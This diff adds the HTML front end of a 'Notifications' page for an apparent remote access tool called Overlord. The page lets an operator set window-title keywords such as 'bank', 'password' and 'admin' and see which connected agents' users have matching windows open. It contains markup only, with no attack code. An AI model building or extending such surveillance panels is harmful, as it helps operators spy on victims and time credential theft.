@@ -1,0 +1,105 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Notifications - Overlord</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <script src="https://cdn.jsdelivr.net/npm/msgpackr@1.11.8/dist/index.js"></script>
+    <link rel="stylesheet" href="/assets/main.css" />
+    <script src="/assets/toast.js"></script>
+    <script src="/assets/ripple.js"></script>
+  </head>
+  <body class="min-h-screen bg-slate-950 text-slate-100">
+    <header id="top-nav"></header>
+
+    <main class="px-5 py-6">
+      <div class="max-w-7xl mx-auto flex flex-col gap-6">
+        <div class="flex flex-wrap items-start justify-between gap-4">
+          <div>
+            <h1 class="text-2xl font-semibold">Notifications</h1>
+            <p class="text-slate-400">
+              Active window alerts based on configured title keywords
+            </p>
+          </div>
+          <div class="flex flex-wrap items-center gap-3">
+            <span
+              id="ws-status"
+              class="inline-flex items-center gap-2 px-3 py-2 rounded-full bg-slate-900/70 text-slate-200 border border-slate-800"
+            >
+              <i class="fa-solid fa-circle-dot text-slate-400"></i>
+              <span>Connecting...</span>
+            </span>
+          </div>
+        </div>
+
+        <div class="bg-slate-900/60 border border-slate-800 rounded-xl p-4">
+          <div class="flex items-center justify-between flex-wrap gap-3">
+            <div>
+              <h2 class="text-lg font-semibold">Keyword Configuration</h2>
+              <p class="text-sm text-slate-400">
+                One keyword per line. Changes apply to connected agents immediately.
+              </p>
+            </div>
+            <button
+              id="save-keywords"
+              class="inline-flex items-center gap-2 px-3 py-2 rounded-lg bg-emerald-600 hover:bg-emerald-700 text-white"
+            >
+              <i class="fa-solid fa-save"></i>
+              <span>Save Keywords</span>
+            </button>
+          </div>
+          <textarea
+            id="keyword-input"
+            rows="6"
+            placeholder="bank\npassword\nadmin"
+            class="mt-3 w-full rounded-lg bg-slate-950 border border-slate-800 text-slate-100 p-3 focus:outline-none focus:border-blue-500"
+          ></textarea>
+          <div class="mt-2 text-xs text-slate-500" id="keyword-hint"></div>
+        </div>
+
+        <div
+          class="bg-slate-900/60 border border-slate-800 rounded-xl p-4"
+        >
+          <div class="overflow-x-auto">
+            <table class="min-w-full text-sm">
+              <thead class="text-slate-400">
+                <tr class="text-left">
+                  <th class="py-2 pr-4">Time</th>
+                  <th class="py-2 pr-4">Client</th>
+                  <th class="py-2 pr-4">User</th>
+                  <th class="py-2 pr-4">Window Title</th>
+                  <th class="py-2 pr-4">Process</th>
+                  <th class="py-2 pr-4">Keyword</th>
+                </tr>
+              </thead>
+              <tbody id="notification-list" class="text-slate-200"></tbody>
+            </table>
+          </div>
+          <div
+            id="empty-state"
+            class="py-8 text-center text-slate-400"
+          >
+            No notifications yet.
+          </div>
+        </div>
+
+      </div>
+    </main>
+
+    <script type="module" src="/assets/nav.js"></script>
+    <script type="module" src="/assets/notifications.js"></script>
+  </body>
+</html>
